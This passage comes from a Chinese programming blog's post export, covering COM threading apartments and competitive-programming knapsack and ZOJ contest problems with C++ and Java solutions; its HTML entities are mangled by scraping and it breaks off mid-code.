比如：对象中的属性1在设计的算法中肯定不会被两个以上的线程写入，只是会被多个线程同时读出而已，因此不用同步，可以用MTA，但对象的属性2却可能被多个线程写入，因此决定使用STA。从而在客户端，通过前面说的CoMarshalInterface和CoUnmarshalInterface将对象指针传到那个只会写入对象的属性1的线程，其实这时就可以直接将对象指针传到这个线程，而不用想上面那样麻烦（而且增加了效率），但是就破坏了COM的套间规矩了——两个线程可以访问对象，但对象在STA套间中。所以？！！什么事都不会发生，因为已经准确知道这个算法不会捅娄子（线程访问冲突），即使破坏COM的规矩又怎样？！而且组件仍可以和其他客户兼容，因为不按规矩来的是客户，与组件无关。不过如果组件破坏规矩，那么它将不能和每一个客户兼容，但并不代表它和任何客户都不兼容。这里其实就是客户和组件联合起来欺骗了COM运行时期库。 上面的例子只是想帮助读者加深对套间的理解，实际中应该尽量保持和COM规范的兼容性（但不兼容并不代表是错误的）。客户要做的工作前面已经说过了（那两个函数或全局接口表或其他只要正确的方式），下面说明组件应该做的工作。组件可以存在于四个套间中（多了一个主STA套间），所需工作分别如下： STA 当一个组件是STA时，它必须同步保护全局变量和静态变量，即对全局变量和静态变量的访问应该用临界段或其他同步手段保护，因为操作全局和静态变量的代码可以被多个STA线程同时执行，所以那些代码的地方要进行保护。比如对象计数（注意，不是引用计数），代表当前组件生成的对象个数，当减为零时，组件被卸载。此变量一般被类厂对象使用，还好ATL和MFC已经帮我们实现了缺省类厂，这里一般不用担心，但自定义的全局或静态变量得自己处理。 主STA 与STA唯一的不同是这是傻瓜型的，连静态和全局变量都可以不用线程保护，因为所有不是安全访问静态和全局变量的对象都通过主线程（第一个调用CoInitialize的线程）的消息派送机制运行，因此不安全的访问都被集中到了一个线程的调用中，因而调用被序列化了，也就实现了对静态和全局变量的线程保护。至于为什么是主线程，因为进程要使用STA，则一定会创建主线程，所以一定可以创建主STA。因此主STA并不是什么第四种套间，只是一个STA套间，不过关联的是主线程而已，由于它可以被用作保护静态和全局变量而被单独提出来说明。因此一个进程内也只有一个主STA套间。 MTA 必须对组件中的每个成员和全局及静态变量的访问使用同步手段进行保护，还应考虑线程问题，即不是简单地保护访问即可，还应注意线程导致的错误的操作，最经典的就是IUnknown::Release()。 [code]DWORD IUnknown::Release(){ DWORD temp = InterlockedDecreament( &amp;m_RefCount ); if( !temp ) // 不能用m_RefCount，原因请自己思考 delete this; // 因此不是只要用原子访问函数保护了m_RefCount的访问就行了 return temp; // 前面对全局变量的保护也和此类似，要考虑线程问题}[/code] 如果读者对自己多线程编程的技术没有信心，建议最好不要编写可以存在于MTA套间的组件，不过就不能获得MTA的高性能了。 在编写MTA时还应该注意到线程亲缘性（thread affinity）。没有线程亲缘性是指没有任何线程范围的成员变量，比如线程局部存储（TLS）、窗口句柄等。也就是说在MTA中不能保存任何记录着TLS内存的指针或窗口句柄，如果保存将没有意义（比如A线程记录的内存空间对B线程来说是无效的，因为TLS构造了一个线程相关的内存空间，就像每个进程都有自己的私有空间）。而不幸地MFC在它的底层运作机制的实现中大量使用了TLS，如模块线程状态、线程状态等。正是由于这个原因，MFC不能编写在MTA中运行的组件。 NA 由于可能会多个线程同时访问NA套间的对象，因此和MTA一样，其不能有线程亲缘性并需要保护每个成员和全局及静态变量。而关于NA的轻量级代理，是由COM+运行时期库生成的，读者完全不用操心（只需将那个组件的ThreadingModel键值赋值为“Neutral”即可）。 前面提到过有一种进程内组件的ThreadingModel键值可以被赋为“Both”，这种组件很像NA，哪个套间都可能直接访问它，但只是可能，而NA组件是可以，这点可以从前面的那个进程内组件所属套间的规则表中看出。这种组件可以支持一种称作自由线程汇集器（FTM——Free Threaded Marshaler）的技术，由于其与本文题目无关，在此不表。当Both的组件使用了自由线程汇集器时，除了满足MTA的要求以外（上面所说的线程安全保护和没有线程相关性），还要记录传进来的接口指针的中立形式（比如IStream*，通过CoMarshallInterface得到），以防止对客户的回调问题。 最后只是提醒一下，有3个STA套间，STA1、STA2和STA3。STA1用CoMarshallInterface得到的IStream*传到STA2中通过CoUnmarshalInterface得到的代理和在STA3中同样通过CoUnmarshalInterface得到的代理不同，不能混用。因为当STA2和STA3调用在STA1的对象时，STA1如果回调（连接点技术就是一种回调）调用者，则STA2和STA3的代理能分别正确的指出需要让哪个线程执行回调操作，即向哪个线程发送消息，因此不能混用。","link":"/posts/f46bbda4/"},{"title":"多样的背包问题回顾","text":"饭卡Time Limit: 5000/1000 MS (Java/Others) Memory Limit: 32768/32768 K (Java/Others) Problem Description电子科大本部食堂的饭卡有一种很诡异的设计，即在购买之前判断余额。如果购买一个商品之前，卡上的剩余金额大于或等于5元，就一定可以购买成功（即使购买后卡上余额为负），否则无法购买（即使金额足够）。所以大家都希望尽量使卡上的余额最少。某天，食堂中有n种菜出售，每种菜可购买一次。已知每种菜的价格以及卡上的余额，问最少可使卡上的余额为多少。 Input多组数据。对于每组数据：第一行为正整数n，表示菜的数量。n&lt;=1000。第二行包括n个正整数，表示每种菜的价格。价格不超过50。第三行包括一个正整数m，表示卡上的余额。m&lt;=1000。 n=0表示数据结束。 Output对于每组输入,输出一行,包含一个整数，表示卡上可能的最小余额。 Sample Input1505101 2 3 2 1 1 2 3 2 1500 Sample Output-4532 SourceUESTC 6th Programming Contest Online [code lang=”cpp”]const int maxn=1e4;const int inf=99999999;const double eps=1e-3;const int lmt=1000; int a[maxn],f[maxn]; int main(){ int n,m; while(~scanf(&quot;%d&quot;,&amp;n)) { if (!n) break; for(int i=1;i&lt;=n;i++) scanf(&quot;%d&quot;,&amp;a[i]); sort(a+1,a+n+1); scanf(&quot;%d&quot;,&amp;m); if (m&lt;5) { printf(&quot;%d\\n&quot;,m);continue; } CLEAR(f); int ans=0; for(int i=1;i&lt;=n-1;i++) { for(int j=m-5;j-a[i]&gt;=0;j–) f[j]=max(f[j],f[j-a[i]]+a[i]); } cout&amp;lt;&amp;lt;m-a[n]-f[m-5]&amp;lt;&amp;lt;endl; } return 0; }[/code] Proud MerchantsTime Limit: 2000/1000 MS (Java/Others) Memory Limit: 131072/65536 K (Java/Others) Problem DescriptionRecently, iSea went to an ancient country. For such a long time, it was the most wealthy and powerful kingdom in the world. As a result, the people in this country are still very proud even if their nation hasn’t been so wealthy any more.The merchants were the most typical, each of them only sold exactly one item, the price was Pi, but they would refuse to make a trade with you if your money were less than Qi, and iSea evaluated every item a value Vi.If he had M units of money, what’s the maximum value iSea could get? InputThere are several test cases in the input. Each test case begin with two integers N, M (1 ≤ N ≤ 500, 1 ≤ M ≤ 5000), indicating the items’ number and the initial money.Then N lines follow, each line contains three numbers Pi, Qi and Vi (1 ≤ Pi ≤ Qi ≤ 100, 1 ≤ Vi ≤ 1000), their meaning is in the description. The input terminates by end of file marker. OutputFor each test case, output one integer, indicating maximum value iSea could get. Sample Input2 1010 15 105 10 53 105 10 53 5 62 7 3 Sample Output511[code lang=”cpp”] #define CLEAR(a,n) memset((a),0,n*sizeof((a)[0])) const int maxn=510;const int maxm=5010; struct data{ int p,q,v; void read() { scanf(&quot;%d%d%d&quot;,&amp;p,&amp;q,&amp;v); }} item[maxn]; bool operator&lt; (const data &amp;a,const data &amp;b){ return a.q-a.p&lt;b.q-b.p;//不是单纯地比较p！} int f[maxm]; int main(){ int n,m; while(~scanf(&amp;quot;%d%d&amp;quot;,&amp;amp;n,&amp;amp;m)) { for(int i=1;i&amp;lt;=n;i++) item[i].read(); sort(item+1,item+n+1); CLEAR(f,maxm); for(int i=1;i&amp;lt;=n;i++) for(int j=m;j&amp;gt;=item[i].q&amp;amp;&amp;amp;j&amp;gt;=item[i].p;j--) f[j]=max(f[j],f[j-item[i].p]+item[i].v); cout&amp;lt;&amp;lt;f[m]&amp;lt;&amp;lt;endl; } return 0; }[/code] ACboy needs your helpTime Limit: 1000/1000 MS (Java/Others) Memory Limit: 32768/32768 K (Java/Others) Problem DescriptionACboy has N courses this term, and he plans to spend at most M days on study.Of course,the profit he will gain from different course depending on the days he spend on it.How to arrange the M days for the N courses to maximize the profit? InputThe input consists of multiple data sets. A data set starts with a line containing two positive integers N and M, N is the number of courses, M is the days ACboy has.Next follow a matrix A[i][j], (1&lt;=i&lt;=N&lt;=100,1&lt;=j&lt;=M&lt;=100).A[i][j] indicates if ACboy spend j days on ith course he will get profit of value A[i][j].N = 0 and M = 0 ends the input. OutputFor each data set, your program should output a line which contains the number of the max profit ACboy will gain. Sample Input2 21 21 32 22 12 12 33 2 13 2 10 0 Sample Output346 SourceHDU 2007-Spring Programming Contest [code lang=”cpp”]const int maxn=110; int a[maxn][maxn],f[2][maxn]; int main(){ int n,m; while(~scanf(&quot;%d%d&quot;,&amp;n,&amp;m),n&amp;&amp;m) { for(int i=1;i&lt;=n;i++) for(int j=1;j&lt;=m;j++) scanf(&quot;%d&quot;,&amp;a[i][j]); CLEAR(f[0],maxn); int cur=0; for(int i=1;i&lt;=n;i++) { CLEAR(f[cur^1],maxn); for(int j=0;j&lt;=m;j++) for(int k=0;k&lt;=m-j;k++) f[cur^1][j+k]=max(f[cur^1][j+k],f[cur][k]+a[i][j]); //for(int j=0;j&lt;=m;j++) //f[0][j]=max(f[0][j],f[1][j]); 并非从前i-1的任何一步中滚过来 cur^=1; } cout&lt;&lt;f[cur][m]&lt;&lt;endl; } return 0;}[/code] ConsumerTime Limit: 4000/2000 MS (Java/Others) Memory Limit: 32768/65536 K (Java/Others) Problem DescriptionFJ is going to do some shopping, and before that, he needs some boxes to carry the different kinds of stuff he is going to buy. Each box is assigned to carry some specific kinds of stuff (that is to say, if he is going to buy one of these stuff, he has to buy the box beforehand). Each kind of stuff has its own value. Now FJ only has an amount of W dollars for shopping, he intends to get the highest value with the money. InputThe first line will contain two integers, n (the number of boxes 1 &lt;= n &lt;= 50), w (the amount of money FJ has, 1 &lt;= w &lt;= 100000) Then n lines follow. Each line contains the following number pi (the price of the ith box 1&lt;=pi&lt;=1000), mi (1&lt;=mi&lt;=10 the number goods ith box can carry), and mi pairs of numbers, the price cj (1&lt;=cj&lt;=100), the value vj(1&lt;=vj&lt;=1000000) OutputFor each test case, output the maximum value FJ can get Sample Input3 800300 2 30 50 25 80600 1 50 130400 3 40 70 30 40 35 60 Sample Output210 [code lang=”cpp”]LL f[2][maxn];int p[maxn],m[maxn],c[maxn],v[maxn]; int main(){ int n,w,sum; while(~scanf(&quot;%d%d&quot;,&amp;n,&amp;w)) { //if (!n&amp;&amp;!w) break; sum=0; for(int i=1;i&lt;=n;i++) { scanf(&quot;%d%d&quot;,&amp;p[i],&amp;m[i]); for(int j=sum+1;j&lt;=sum+m[i];j++) scanf(&quot;%d%d&quot;,&amp;c[j],&amp;v[j]); sum+=m[i]; } //for(int i=1;i&lt;=sum;i++) cout&lt;&lt;c[i]&lt;&lt;’ ‘&lt;&lt;v[i]&lt;&lt;endl; CLEAR(f); sum=0; bool cur=0; for(int i=1;i&amp;lt;=n;i++) { for(int j=0;j&amp;lt;=w-p[i];j++) f[cur^1][j+p[i]]=f[cur][j]; for(int k=1;k&amp;lt;=m[i];k++) for(int j=w;j&amp;gt;=c[sum+k]+p[i];j--) { f[cur^1][j]=max(f[cur^1][j],f[cur^1][j-c[sum+k]]+(LL)v[sum+k]); } for(int j=w;j&amp;gt;=p[i];j--) f[cur][j]=max(f[cur][j],f[cur^1][j]); sum+=m[i]; //cur^=1; } int ans=0; //for(int j=0;j&amp;lt;=w;j++) cout&amp;lt;&amp;lt;f[cur^1][j]&amp;lt;&amp;lt;&apos; &apos;;cout&amp;lt;&amp;lt;endl;//ans=max(ans,f[cur][j]); //for(int j=0;j&amp;lt;=w;j++) cout&amp;lt;&amp;lt;f[cur][j]&amp;lt;&amp;lt;&apos; &apos;;cout&amp;lt;&amp;lt;endl; cout&amp;lt;&amp;lt;f[cur][w]&amp;lt;&amp;lt;endl; } return 0; }[/code] The more, The BetterTime Limit: 6000/2000 MS (Java/Others) Memory Limit: 32768/32768 K (Java/Others) Problem DescriptionACboy很喜欢玩一种战略游戏，在一个地图上，有N座城堡，每座城堡都有一定的宝物，在每次游戏中ACboy允许攻克M个城堡并获得里面的宝物。但由于地理位置原因，有些城堡不能直接攻克，要攻克这些城堡必须先攻克其他某一个特定的城堡。你能帮ACboy算出要获得尽量多的宝物应该攻克哪M个城堡吗？ Input每个测试实例首先包括2个整数，N,M.(1 &lt;= M &lt;= N = 0。当N = 0, M = 0输入结束。 Output对于每个测试实例，输出一个整数，代表ACboy攻克M个城堡所获得的最多宝物的数量。 Sample Input3 20 10 20 37 42 20 10 42 17 17 62 20 0 Sample Output513 Author8600 SourceHDU 2006-12 Programming Contest [code lang=”cpp”]const int maxn=210; struct Edge{ int to,next; Edge(){} Edge(int v,int w):to(v),next(w){}} edge[maxn];int head[maxn];int ve[maxn];int n,m;int f[maxn][maxn]; void addedge(int u,int v){ edge[head[0]]=Edge(v,head[u]); head[u]=head[0]++;} void init(){ memset(head,-1,maxn*sizeof(head[0])); head[0]=1; ve[1]=0;} void dfs(int u){ CLEAR(f[u],maxn); f[u][0]=ve[u]; for(int i=head[u];i&gt;-1;i=edge[i].next) { int v=edge[i].to; dfs(v); //for(int j=1;j&lt;=m;j++) 密切关注状态转移方向和范围 //for(int k=1;k&lt;=m-j;k++) //f[u][j+k]=max(f[u][j+k],f[u][k]+f[v][j]); for(int j=m;j&gt;0;j–) for(int k=1;k&lt;=j;k++) f[u][j]=max(f[u][j],f[u][j-k]+f[v][k-1]); //cout&lt;&lt;u&lt;&lt;’-‘&lt;&lt;v&lt;&lt;’ ‘&lt;&lt;f[u][m]&lt;&lt;endl; } //for(int j=0;j&lt;=m;j++) f[u][j]+=ve[u];边界条件} int main(){ while(~scanf(&amp;quot;%d%d&amp;quot;,&amp;amp;n,&amp;amp;m),n&amp;amp;&amp;amp;m) { init(); for(int i=1;i&amp;lt;=n;i++) { int a,b; scanf(&amp;quot;%d%d&amp;quot;,&amp;amp;a,&amp;amp;b); addedge(a+1,i+1); ve[i+1]=b; } dfs(1); cout&amp;lt;&amp;lt;f[1][m]&amp;lt;&amp;lt;endl; } return 0; }[/code] Gold minerTime Limit: 4000/2000 MS (Java/Others) Memory Limit: 32768/32768 K (Java/Others) Problem DescriptionHomelesser likes playing Gold miners in class. He has to pay much attention to the teacher to avoid being noticed. So he always lose the game. After losing many times, he wants your help. To make it easy, the gold becomes a point (with the area of 0). You are given each gold’s position, the time spent to get this gold, and the value of this gold. Maybe some pieces of gold are co-line, you can only get these pieces in order. You can assume it can turn to any direction immediately.Please help Homelesser get the maximum value. InputThere are multiple cases.In each case, the first line contains two integers N (the number of pieces of gold), T (the total time). (0＜N≤200, 0≤T≤40000)In each of the next N lines, there four integers x, y (the position of the gold), t (the time to get this gold), v (the value of this gold). (0≤|x|≤200, 0＜y≤200,0＜t≤200, 0≤v≤200) OutputPrint the case number and the maximum value for each test case. Sample Input3 101 1 1 12 2 2 21 3 15 93 101 1 13 12 2 2 21 3 4 7 Sample OutputCase 1: 3Case 2: 7 AuthorHIT Source2012 Multi-University Training Contest 5 [code lang=”cpp”]int dblcmp(double d){ if (fabs(d)&lt;eps) return 0; else return (d&gt;0)?1:-1;} struct data{ int x,y,t,v; data(){x=y=t=v=0;}; data(int _x,int _y,int _t,int _v):x(_x),y(_y),t(_t),v(_v){}; void prt() { cout&lt;&lt;x&lt;&lt;’ ‘&lt;&lt;y&lt;&lt;’ ‘&lt;&lt;t&lt;&lt;’ ‘&lt;&lt;v&lt;&lt;endl; }} gold[maxn]; int dist(data a){ return a.xa.x+a.ya.y;} bool operator&lt; (const data &amp;a,const data &amp;b){ if (dblcmp(a.x b.y - b.x a.y)==0) return dist(a)&lt;dist(b); return dblcmp(a.x b.y - b.x a.y)&gt;0; //if (dist(a)==dist(b)) return dblcmp(a.x b.y - b.x a.y); //return dist(a)&lt;dist(b);} bool operator== (const data &amp;a,const data &amp;b){ return dblcmp(a.x b.y - b.x a.y)==0;} bool operator!= (const data &amp;a,const data &amp;b){ return !(a==b);} typedef vector&lt;data&gt; vec;typedef map&lt;int,vec&gt; hashmap;hashmap mp; int f[maxl];vec vc[maxn]; int main(){ int n,m,kase=0; while(~scanf(&quot;%d%d&quot;,&amp;n,&amp;m)) { mp.clear(); for(int i=1;i&lt;=n;i++) { int x,y,t,v; scanf(&quot;%d%d%d%d&quot;,&amp;x,&amp;y,&amp;t,&amp;v); gold[i]=data(x,y,t,v); } //puts(&amp;quot;--&amp;quot;); sort(gold+1,gold+n+1); int cnt=1; vc[cnt].clear(); for(int i=1;i&amp;lt;=n;i++) { if (vc[cnt].size()) { data tmp=vc[cnt][vc[cnt].size()-1]; gold[i]=data(gold[i].x,gold[i].y,gold[i].t+tmp.t,gold[i].v+tmp.v); } vc[cnt].push_back(gold[i]); if (gold[i]!=gold[i+1]) vc[++cnt].clear(); } CLEAR(f); /*for(int k=1;k&amp;lt;=cnt;k++) { for(int i=0;i&amp;lt;vc[k].size();i++) vc[k][i].prt(); puts(&amp;quot;-&amp;quot;); }*/ for(int k=1;k&amp;lt;=cnt;k++) for(int j=m;j&amp;gt;=0;j--) for(int i=0;i&amp;lt;vc[k].size();i++) if (j&amp;gt;=vc[k][i].t) f[j]=max(f[j],f[j-vc[k][i].t]+vc[k][i].v); printf(&amp;quot;Case %d: %d\\n&amp;quot;,++kase,f[m]); } return 0; }[/code] Beam CannonTime Limit: 3000/1500 MS (Java/Others) Memory Limit: 65536/65536 K (Java/Others) Problem DescriptionRecently, the γ galaxies broke out Star Wars. Each planet is warring for resources. In the Star Wars, Planet X is under attack by other planets. Now, a large wave of enemy spaceships is approaching. There is a very large Beam Cannon on the Planet X, and it is very powerful, which can destroy all the spaceships in its attack range in a second. However, it takes a long time to fill the energy of the Beam Cannon after each shot. So, you should make sure each shot can destroy the enemy spaceships as many as possible.To simplify the problem, the Beam Cannon can shot at any area in the space, and the attack area is rectangular. The rectangle parallels to the coordinate axes and cannot rotate. It can only move horizontally or vertically. The enemy spaceship in the space can be considered as a point projected to the attack plane. If the point is in the rectangular attack area of the Beam Cannon(including border), the spaceship will be destroyed. InputInput contains multiple test cases. Each test case contains three integers N(1&lt;=N&lt;=10000, the number of enemy spaceships), W(1&lt;=W&lt;=40000, the width of the Beam Cannon’s attack area), H(1&lt;=H&lt;=40000, the height of the Beam Cannon’s attack area) in the first line, and then N lines follow. Each line contains two integers x,y (-20000&lt;=x,y&lt;=20000, the coordinates of an enemy spaceship).A test case starting with a negative integer terminates the input and this test case should not to be processed. OutputOutput the maximum number of enemy spaceships the Beam Cannon can destroy in a single shot for each case. Sample Input2 3 40 11 03 1 1-1 00 11 0-1 Sample Output22 Source2014上海全国邀请赛——题目重现（感谢上海大学提供题目） FATETime Limit: 2000/1000 MS (Java/Others) Memory Limit: 32768/32768 K (Java/Others) Problem Description最近xhd正在玩一款叫做FATE的游戏，为了得到极品装备，xhd在不停的杀怪做任务。久而久之xhd开始对杀怪产生的厌恶感，但又不得不通过杀怪来升完这最后一级。现在的问题是，xhd升掉最后一级还需n的经验值，xhd还留有m的忍耐度，每杀一个怪xhd会得到相应的经验，并减掉相应的忍耐度。当忍耐度降到0或者0以下时，xhd就不会玩这游戏。xhd还说了他最多只杀s只怪。请问他能升掉这最后一级吗？ Input输入数据有多组，对于每组数据第一行输入n，m，k，s(0 &lt; n,m,k,s &lt; 100)四个正整数。分别表示还需的经验值，保留的忍耐度，怪的种数和最多的杀怪数。接下来输入k行数据。每行数据输入两个正整数a，b(0 &lt; a,b &lt; 20)；分别表示杀掉一只这种怪xhd会得到的经验值和会减掉的忍耐度。(每种怪都有无数个) Output输出升完这级还能保留的最大忍耐度，如果无法升完这级输出-1。 Sample Input10 10 1 101 110 10 1 91 19 10 2 101 12 2 Sample Output0-11 AuthorXhd [code lang=”cpp”]int f[maxn][maxn];//exp,sumint v[maxn],w[maxn]; int main(){ int n,m,st,K; while(~scanf(&quot;%d%d%d%d&quot;,&amp;st,&amp;m,&amp;n,&amp;K)) { for(int i=1;i&lt;=n;i++) scanf(&quot;%d%d&quot;,&amp;v[i],&amp;w[i]); memset(f,0,sizeof(f)); for(int i=1;i&lt;=n;i++) //for(int j=m;j&gt;=0;j–) for(int j=w[i];j&lt;=m;j++) for(int k=1;k&lt;=K;k++) f[j][k]=max(f[j][k],f[j-w[i]][k-1]+v[i]); /int ans=0; for(int i=1;i&lt;=K;i++) ans=max(ans,f[0][i]); if (ans&lt;st) printf(&quot;-1\\n&quot;); else printf(&quot;%d\\n&quot;,ans);/ bool ans=0; for(int i=1;i&lt;=m;i++) if (f[i][K]&gt;=st) { ans=1; printf(&quot;%d\\n&quot;,m-i); break; } if (!ans) printf(&quot;-1\\n&quot;); } return 0;}[/code]","link":"/posts/4c322283/"},{"title":"ZOJ Monthly, July 2015","text":"B.Help Bob Time Limit: 2 Seconds Memory Limit: 65536 KB Problem DescriptionThere is a game very popular in ZJU at present, Bob didn’t meant to participate in it. But he decided to join it after discovering a lot of pretty girls playing it.There are n stones on the ground and they are marked as 1 to n respectively. There will be 2 players in each competition. And the game rules are simple, A and B take turns to move. Each round, one of them can only take 1 number away, and then pick out all the divisors of the choosed number. When anyone who can not take away 1 number any longer, he will fail the whole game. InputThere are multiple cases. Each case include an integer number n (0 ≤ n ≤ 100). OutputFor each case, A win, output “win”. If not, output”fail”. Sample Input34 Sample Outputwinwin 乍一看是博弈，其实啥都没！问题中的决策不一定最优，只要求获胜的可能……[code lang=”java”]import java.io.;import java.util.;public class Main { public static void main(String[] args) throws IOException { StreamTokenizer in=new StreamTokenizer(new BufferedInputStream(System.in)); PrintWriter out=new PrintWriter(System.out); while(in.nextToken()!=StreamTokenizer.TT_EOF){ int n=(int)in.nval; if (n==0) out.println(&quot;fail&quot;); else out.println(&quot;win&quot;); } out.flush(); out.close(); }}[/code] E.The Exchange of Items Time Limit: 2 Seconds Memory Limit: 65536 KB Problem DescriptionBob lives in an ancient village, where transactions are done by one item exchange with another. Bob is very clever and he knows what items will become more valuable later on. So, Bob has decided to do some business with villagers.At first, Bob has N kinds of items indexed from 1 to N, and each item has Ai. There are M ways to exchanges items. For the ith way (Xi, Yi), Bob can exchange one Xith item to one Yith item, vice versa. Now Bob wants that his ith item has exactly Bi, and he wonders what the minimal times of transactions is. InputThere are multiple test cases.For each test case: the first line contains two integers: N and M (1 &lt; = N, M &lt;= 100).The next N lines contains two integers: Ai and Bi (1 &lt; = Ai, Bi &lt;= 10,000).Following M lines contains two integers: Xi and Yi (1 &lt; = Xi, Yi &lt;= N).There is one empty line between test cases. OutputFor each test case output the minimal times of transactions. If Bob could not reach his goal, output -1 instead. Sample Input2 11 22 11 2 4 21 32 13 22 31 23 4 Sample Output1-1 被这题的思维折腾哭了啊，从不可行的二分图，到搜索以及最短路径，再到乱七八糟的区间DP，不知多晚才拾起网络流……伪最短路，RE[code lang=”java”]import java.io.;import java.util.;public class Main { static int[] a,f; static int[][] E; static int maxstep=10000; static int n,m; final static int pri=17; static int hashCode(int[] a){ int s1=0,s2=0; int len=a.length; /for(int i=0;i&lt;len;i++){ s1=19; s1+=a[i]%19; }/ for(int i=0;i&lt;len;i++){ s2=pri; s2+=Math.abs(a[i])%pri; } return s2; } static int spfa(int[] st){ HashMap&lt;Integer, Integer&gt; mp=new HashMap&lt;Integer, Integer&gt;(); BitSet vis=new BitSet(); Queue&lt;int[]&gt; que=new LinkedList&lt;int[]&gt;(); que.add(st); mp.put(hashCode(st), 0); vis.set(hashCode(st)); while(!que.isEmpty()){ int[] u=que.poll(); int p=mp.get(hashCode(u)); if (p&gt;=maxstep) return -1; for(int i=1;i&lt;=m;i++){ int[] v=u.clone(); v[E[0][i]]–; v[E[1][i]]++; int hv=hashCode(v); if (hv==0) return p+1; if (que.contains(v)){ int q=mp.get(hv); if (p+1&lt;q){ //vis.replace(hv, p+1); mp.remove(hv); mp.put(hv, p+1); if (!vis.get(hv)){ que.add(v); vis.set(hv); } } } else{ mp.put(hv, p+1); if (!vis.get(hv)){ que.add(v); vis.set(hv); } } } } return -1; } public static void main(String[] args) throws IOException { // TODO Auto-generated method stub StreamTokenizer in=new StreamTokenizer(new BufferedInputStream(System.in)); PrintWriter out=new PrintWriter(System.out); while(in.nextToken()!=StreamTokenizer.TT_EOF){ n=(int)in.nval; in.nextToken(); m=(int)in.nval; a=new int[n+1]; for(int i=1;i&lt;=n;i++){ in.nextToken(); int x=(int)in.nval; in.nextToken(); int y=(int)in.nval; a[i]=y-x; } E=new int[2][m+1]; for(int i=1;i&lt;=m;i++){ in.nextToken(); int u=(int)in.nval; in.nextToken(); int v=(int)in.nval; E[0][i]=u;E[1][i]=v; //a[u]–;a[v]++;out.println(hashCode(a)); } int res=spfa(a); out.println(res); out.flush(); } out.close(); }}[/code]最小费用流，AC[code lang=”java”]import java.io.BufferedInputStream;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.io.OutputStreamWriter;import java.io.PrintWriter;import java.io.StreamTokenizer;import java.math.BigInteger;import java.util.ArrayList;import java.util.Arrays;import java.util.Comparator;import java.util.HashMap;import java.util.LinkedList;import java.util.PriorityQueue;import java.util.Queue;import java.util.Scanner;import java.util.Stack;import java.util.StringTokenizer; import com.sun.org.apache.regexp.internal.recompile; public class Main { public static void main(String[] args) throws IOException{ StreamTokenizer cin = new StreamTokenizer(new BufferedInputStream(System.in)); InputReader in = new InputReader(System.in) ; PrintWriter out = new PrintWriter(System.out) ; while(cin.nextToken() != cin.TT_EOF){ new Task().solve(cin, out) ; //out.flush() ; } out.flush() ; /* int t = in.nextInt() ; while(t-- &amp;gt; 0){ new Task().solve(in , out) ; } out.flush() ; */ } } class Task{ static int[] a = new int[108] ; static int[] b = new int[108] ; static ArrayList&amp;lt;Integer&amp;gt;[] adj = new ArrayList[108] ; static ArrayList&amp;lt;Integer&amp;gt;[] colorg = new ArrayList[108] ; static int[] color = new int[108] ; void dfs(int u , int c){ color[u] = c ; colorg[c].add(u) ; for(int v : adj[u]){ if(color[v] == -1) dfs(v , c) ; } } int[] dist = new int[108] ; boolean[] in = new boolean[108] ; void spfa(int s){ Arrays.fill(dist, Integer.MAX_VALUE) ; dist[s] = 0 ; Arrays.fill(in, false) ; in[s] = true ; Queue&amp;lt;Integer&amp;gt; q = new LinkedList&amp;lt;Integer&amp;gt;() ; q.add(s) ; while(! q.isEmpty()){ int u = q.poll() ; in[u] = false ; for(int v : adj[u]){ if(dist[u] + 1 &amp;lt; dist[v]){ dist[v] = dist[u] + 1 ; if(! in[v]){ in[v] = true ; q.add(v) ; } } } } } public void solve(StreamTokenizer cin , PrintWriter out) throws IOException{ int n = (int) cin.nval ; cin.nextToken() ; int m = (int) cin.nval ; for(int i = 1 ; i &amp;lt;= n ; i++){ cin.nextToken() ; a[i] = (int) cin.nval ; cin.nextToken() ; b[i] = (int) cin.nval ; } for(int i = 1 ; i &amp;lt;= n ; i++) adj[i] = new ArrayList&amp;lt;Integer&amp;gt;() ; while(m-- &amp;gt; 0){ cin.nextToken() ; int u = (int) cin.nval ; cin.nextToken() ; int v = (int) cin.nval ; adj[u].add(v) ; adj[v].add(u) ; } Arrays.fill(color, -1) ; for(int i = 0 ; i &amp;lt;= n ; i++) colorg[i] = new ArrayList&amp;lt;Integer&amp;gt;() ; int k = 0 ; for(int i = 1 ; i &amp;lt;= n ; i++){ if(color[i] == -1){ dfs(i , k++) ; } } int sum = 0 ; for(int i = 0 ; i &amp;lt; k ; i++){ int sa = 0 , sb = 0 ; for(int u : colorg[i]){ sa += a[u] ; sb += b[u] ; sum += Math.abs(a[u] - b[u]) ; } if(sa != sb){ out.println(-1) ; return ; } } ArrayList&amp;lt;Integer&amp;gt; adx = new ArrayList&amp;lt;Integer&amp;gt;() ; ArrayList&amp;lt;Integer&amp;gt; ady = new ArrayList&amp;lt;Integer&amp;gt;() ; for(int i = 1 ; i &amp;lt;= n ; i++){ if(a[i] &amp;gt; b[i]) adx.add(i) ; else if(a[i] &amp;lt; b[i]) ady.add(i) ; } int N= adx.size() ; int M= ady.size() ; Mincostflow mcf = new Mincostflow(0 , 2*N+2*M+1) ; for(int i = 1 ; i &amp;lt;= N ; i++){ int u = adx.get(i-1) ; mcf.add(i, N + i, a[u] - b[u] , 0) ; mcf.add(0, i, Integer.MAX_VALUE , 0) ; } for(int i = 1 ; i &amp;lt;= M ; i++){ int u = ady.get(i-1) ; mcf.add(2*N + i, 2*N + M + i, b[u] - a[u] , 0 ) ; mcf.add(2*N+M+i , 2*N+2*M+1, Integer.MAX_VALUE , 0) ; } for(int i = 1 ; i &amp;lt;= adx.size() ; i++){ int u = adx.get(i-1) ; spfa(u) ; for(int j = 1 ; j &amp;lt;= ady.size() ; j++){ int v = ady.get(j-1) ; if(dist[v] == Integer.MAX_VALUE) continue ; mcf.add(N+i, 2*N+j, Integer.MAX_VALUE, dist[v] ) ; } } out.println(mcf.mincostflow()) ; } } class Mincostflow{ public Mincostflow(int sourse , int meet){ this.source = sourse ; this.meet = meet ; Arrays.fill(g, 0) ; id = 1 ; } static final int maxn = 5000 , maxm = 50000 ; static class Edge{ int v , f , w , next ; Edge(){} Edge(int _v , int _f , int _w , int _next){ this.v = _v ; this.f = _f ; this.w = _w ; this.next = _next ; } } static int[] g = new int[maxn + 10] ; static Edge[] e = new Edge[maxm + 10] ; int source , meet ; int id ; void add(int u , int v , int f , int w){ e[++id] = new Edge(v , f , w , g[u]) ; g[u] = id ; e[++id] = new Edge(u , 0 , -w , g[v]) ; g[v] = id ; } Queue&amp;lt;Integer&amp;gt; que = new LinkedList&amp;lt;Integer&amp;gt;() ; static boolean[] in = new boolean[maxn + 10] ; static int[] dist = new int[maxn + 10] ; static int[] pv = new int[maxn + 10] ; static int[] pe = new int[maxn + 10] ; boolean bfs(){ while(! que.isEmpty()) que.poll() ; 